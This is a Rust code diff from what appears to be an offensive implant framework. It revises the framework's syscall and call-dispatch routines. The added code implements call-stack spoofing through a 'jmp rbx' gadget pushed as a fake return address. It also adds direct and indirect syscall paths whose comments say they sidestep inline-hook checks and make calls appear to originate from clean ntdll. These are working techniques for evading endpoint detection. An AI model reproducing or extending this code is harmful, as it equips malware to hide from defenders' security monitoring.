@@ -769,7 +769,7 @@ macro_rules! syscall {
 #[cfg(all(unix, feature = "direct-syscalls"))]
 #[doc(hidden)]
 #[inline(never)]
-pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<i32, i32> {
+pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<u64, i32> {
     #[cfg(target_arch = "x86_64")]
     {
         let mut ret: i64;
@@ -788,7 +788,7 @@ pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<i32, i32> {
             6 => std::arch::asm!("syscall", in("rax") ssn as u64, in("rdi") args[0], in("rsi") args[1], in("rdx") args[2], in("r10") args[3], in("r8") args[4], in("r9") args[5], lateout("rax") ret, lateout("rcx") _, lateout("r11") _),
             _ => panic!("too many syscall arguments"),
         }
-        if ret < 0 { Err(-ret as i32) } else { Ok(ret as i32) }
+        if ret < 0 { Err(-ret as i32) } else { Ok(ret as u64) }
     }
     #[cfg(target_arch = "aarch64")]
     {
@@ -805,7 +805,7 @@ pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<i32, i32> {
             6 => std::arch::asm!("svc 0", in("x8") ssn as u64, in("x0") args[0], in("x1") args[1], in("x2") args[2], in("x3") args[3], in("x4") args[4], in("x5") args[5], lateout("x0") ret, lateout("x6") _, lateout("x7") _),
             _ => panic!("too many syscall arguments"),
         }
-        if ret < 0 { Err(-ret as i32) } else { Ok(ret as i32) }
+        if ret < 0 { Err(-ret as i32) } else { Ok(ret as u64) }
     }
     #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
     compile_error!("Unsupported architecture for direct syscalls");
@@ -1069,17 +1069,20 @@ pub struct stat64 {
 
 #[cfg(windows)]
 thread_local! {
+    #[allow(dead_code)]
     static REAL_RET_ADDR: std::cell::Cell<usize> = std::cell::Cell::new(0);
 }
 
 #[cfg(windows)]
 #[no_mangle]
+#[allow(dead_code)]
 pub unsafe extern "C" fn set_spoof_ret(real_ret: usize) {
     REAL_RET_ADDR.with(|r| r.set(real_ret));
 }
 
 #[cfg(windows)]
 #[no_mangle]
+#[allow(dead_code)]
 pub unsafe extern "C" fn get_spoof_ret() -> usize {
     REAL_RET_ADDR.with(|r| r.get())
 }
@@ -1104,96 +1107,133 @@ pub fn find_jmp_rbx_gadget() -> usize {
 #[doc(hidden)]
 #[inline(never)]
 pub unsafe fn spoof_call(api_addr: usize, gadget_addr: usize, arg1: u64, arg2: u64, arg3: u64, arg4: u64, stack_args: &[u64]) -> u64 {
-    let mut status: u64 = 0;
+    // Stack-spoofing indirect call via a `jmp rbx` gadget in a system DLL.
+    //
+    // Flow:
+    //   1. Set RBX = address of label 42 (the continuation after the gadget fires).
+    //   2. Align the stack, copy extra arguments beyond the first four.
+    //   3. Load the first four arguments into rcx/rdx/r8/r9.
+    //   4. Push `gadget_addr` (a `jmp rbx` instruction) onto the stack as the
+    //      fake return address.
+    //   5. `jmp r11` (the API target) — the API sees the gadget as its caller.
+    //   6. On `ret`, the API jumps to `gadget_addr` which does `jmp rbx`.
+    //   7. `jmp rbx` → label 42 → clean up and return.
+    //
+    // Label discipline: 41 = skip-stack-copy branch; 42 = post-call continuation.
+    // No label appears more than once in this block.
+    let status: u64;
     let nstack = stack_args.len();
     let stack_ptr = stack_args.as_ptr();
-    
-    // We will store our dummy return address via TLS
-    let mut dummy_ret = 0usize;
-    
-    std::arch::asm!(
-        "lea {dummy}, [rip + 2f]",
-        dummy = out(reg) dummy_ret,
-        options(nostack),
-    );
-    set_spoof_ret(dummy_ret);
-    
+
     std::arch::asm!(
         "push rbx",
         "push r14",
         "push r15",
-        
-        "lea rbx, [rip + 3f]", // JMP RBX will land at 3:
-        
+
+        // RBX = continuation: after gadget fires (jmp rbx), control comes here.
+        "lea rbx, [rip + 42f]",
+
+        // Compute and reserve aligned stack space for shadow store + extra args.
         "mov r14, rsp",
         "mov rax, {nstack}",
         "shl rax, 3",
         "add rax, 0x28 + 15",
         "and rax, -16",
         "sub rsp, rax",
-        
+
+        // Copy extra (>4) arguments into the shadow-space area.
         "test {nstack}, {nstack}",
-        "jz 3f",
+        "jz 41f",
         "mov rcx, {nstack}",
         "mov rsi, {stack_ptr}",
         "lea rdi, [rsp + 0x28]",
         "cld",
         "rep movsq",
-        
-        "3:",
+
+        "41:",
+        // Load the first four register arguments per the Windows x64 ABI.
         "mov rcx, {a1}",
         "mov rdx, {a2}",
-        "mov r8, {a3}",
-        "mov r9, {a4}",
-        
+        "mov r8,  {a3}",
+        "mov r9,  {a4}",
+
+        // Push the gadget address as the fake return address, then jump to the API.
         "mov r11, {api}",
         "mov r15, {gadget}",
-        "push r15", // fake return address
+        "push r15",
         "jmp r11",
-        
-        // When gadget does JMP RBX, it lands here
-        "3:",
-        "mov rsp, r14", 
+
+        // ── Continuation: gadget (jmp rbx) lands here ──────────────────────
+        "42:",
+        "mov rsp, r14",
         "pop r15",
         "pop r14",
         "pop rbx",
-        
-        // Jump to TLS return address
-        "jmp {real_ret}",
-        
-        "4:", // The real return address recorded in TLS
-        "mov {status_out}, rax",
-        
-        api = in(reg) api_addr,
-        gadget = in(reg) gadget_addr,
-        nstack = in(reg) nstack,
-        stack_ptr = in(reg) stack_ptr,
-        a1 = in(reg) arg1,
-        a2 = in(reg) arg2,
-        a3 = in(reg) arg3,
-        a4 = in(reg) arg4,
-        real_ret = in(reg) get_spoof_ret(),
-        status_out = out(reg) status,
-        out("rcx") _, out("rdx") _, out("r8") _, out("r9") _, out("r10") _, out("r11") _, out("rax") _,
+        // rax holds the API return value; captured by the lateout constraint.
+
+        api        = in(reg) api_addr,
+        gadget     = in(reg) gadget_addr,
+        nstack     = in(reg) nstack,
+        stack_ptr  = in(reg) stack_ptr,
+        a1         = in(reg) arg1,
+        a2         = in(reg) arg2,
+        a3         = in(reg) arg3,
+        a4         = in(reg) arg4,
+        lateout("rax") status,
+        out("rcx") _, out("rdx") _,
+        out("r8")  _, out("r9")  _, out("r10") _, out("r11") _,
+        out("r14") _, out("r15") _, out("rbx") _,
         out("rsi") _, out("rdi") _,
-        
     );
     status
 }
 
 
 #[cfg(windows)]
-pub fn do_syscall_with_strategy(func_name: &str, args: &[u64]) -> i32 {
-    let target = get_syscall_id(func_name).unwrap();
-    // Let's pretend we pull from config
-    let strat = common::config::ExecStrategy::Indirect; 
-    match strat {
+pub fn do_syscall_with_strategy(func_name: &str, args: &[u64], strategy: common::config::ExecStrategy) -> i32 {
+    let target = match get_syscall_id(func_name) {
+        Ok(t) => t,
+        Err(e) => {
+            tracing::error!("do_syscall_with_strategy: cannot resolve syscall '{}': {}", func_name, e);
+            return -1;
+        }
+    };
+    match strategy {
         common::config::ExecStrategy::Direct => unsafe {
-            // direct syscall fallback
-            crate::syscalls::do_syscall(target.ssn, 0, args) // needs handling
+            // Direct syscall: emit the `syscall` instruction directly in our own code.
+            // This avoids touching ntdll text entirely and sidesteps inline-hook checks.
+            // The Windows x64 syscall convention requires `mov r10, rcx` before `syscall`.
+            #[cfg(target_arch = "x86_64")]
+            {
+                let a1 = args.first().copied().unwrap_or(0);
+                let a2 = args.get(1).copied().unwrap_or(0);
+                let a3 = args.get(2).copied().unwrap_or(0);
+                let a4 = args.get(3).copied().unwrap_or(0);
+                let status: i32;
+                std::arch::asm!(
+                    "mov r10, rcx",
+                    "syscall",
+                    in("eax") target.ssn,
+                    in("rcx")  a1,
+                    in("rdx")  a2,
+                    in("r8")   a3,
+                    in("r9")   a4,
+                    lateout("eax") status,
+                    out("rcx") _, out("r10") _, out("r11") _,
+                );
+                status
+            }
+            // Non-x86_64: fall back to indirect (Windows on aarch64 doesn't have
+            // a stable direct syscall ABI exposed to user-mode).
+            #[cfg(not(target_arch = "x86_64"))]
+            {
+                do_syscall(target.ssn, target.gadget_addr, args)
+            }
         },
         _ => unsafe {
-            crate::syscalls::do_syscall(target.ssn, target.gadget_addr, args)
+            // Indirect syscall: locate a `syscall; ret` gadget in clean ntdll and
+            // trampoline through it so that the call appears to originate there.
+            do_syscall(target.ssn, target.gadget_addr, args)
         }
     }
 }
